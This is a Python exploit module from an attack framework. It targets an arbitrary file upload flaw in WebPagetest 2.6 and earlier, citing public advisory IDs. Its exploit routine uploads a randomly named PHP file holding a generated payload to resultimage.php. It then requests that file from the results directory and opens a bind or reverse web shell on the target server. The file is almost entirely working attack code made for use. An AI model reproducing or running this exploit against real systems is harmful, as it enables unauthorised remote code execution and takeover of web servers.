'''
Created on Jul 24, 2012

@author: aeon
'''

# must include this
from core.core import exploit
from core.wshttplib import webconnection

class exploit(exploit):
    """
    The generic exploit template
    """
    
    def set_title(self):
        self.title = "WebPagetest <= 2.6 (resultimage.php) arbitrary file upload vulnerability"
          
    def set_description(self):
        self.description = \
        """
        This module exploits a unprotected file upload vulnerability in webpagetest <= v2.6 application.
        This results in arbitrary code execution against the web application."""    
        
    def set_author(self):
        self.author = \
        [
            ['dun','<posdub[at]gmail.com>'],                  # vulnerability discovery
            ['aeon','<aeon.s.flux[at]gmail.com>'],            # zro module
        ]

    def set_references(self):
        self.references = \
        [
            ['edb','19790'],    # http://www.exploit-db.com/exploits/19790/
            ['bid','54442'],    # http://www.securityfocus.com/bid/54442
            ['osvdb', '83823']  # http://osvdb.org/83823
        ]
        
    # needs fixing
    def register_options(self):
        self.opt_params["uripath"][0] = "/"
        self.opt_params["user"] = \
        [
            "aeon", "The username to specify for webpagetest" 
        ]
        self.opt_params["pass"] = \
        [
            "password", "The password to specify for webpagetest"
        ]
    
    def set_platform(self):
        self.platform = "php"

    def list_attacks(self):
        pass
    
    def exploit(self):

        # create a new webconnection instance
        request = webconnection()
        
        # clean up the list of options
        target   = self.opt_params["target"][0]
        tport   = self.opt_params["tport"][0]
        lport   = self.opt_params["lport"][0]
        proxy   = self.adv_params["proxy"][0]
        uripath = self.opt_params["uripath"][0]
        ssl     = self.adv_params["ssl"][0]

        # randomize variables
        filename = "%s.php" % (request.random())
        
        # generate the payload
        payload = "<?php %s ?>" % (self.gen_payload())
        
        # full request path
        requestpath = "%swork/resultimage.php" % (uripath)

        # full request payload path
        payloadpath = "%sresults/%s" % (uripath,filename)
       
        # set the proxy if needed
        if proxy:
            request.set_proxy(proxy)
                
        if self.get_payload_type() == "bind":
            request.set_lport(lport)
        # set the parameters as required
        request.ssl = ssl
        request.set_type("POST")
        request.set_content_type("multipart")
        request.set_target("%s:%s" % (target, tport))
        request.set_full_path(requestpath)
        request.set_post_params({"file": [filename , payload]})     
        
        # print some text to the screen
        self.print_status("\n(+) Triggering backdoor against target %s" % target)
        
        # do the upload
        response = request.do_file_upload()
        #res = response.info()
        code = response.getcode()
        if response.getcode() == 200:
            self.print_status("(+) Exploit successful against %s" % target)
            
            # update the full path
            request.set_full_path(payloadpath)
            

            request.execute_web_shell(self.get_payload_type())
            
        elif response.getcode() != 200:
            self.print_error("(-) Exploit was unsuccessful against %s" % target)
            self.print_error("(-) Check your parameters")
        
        
        
            
        
        
        
        
        
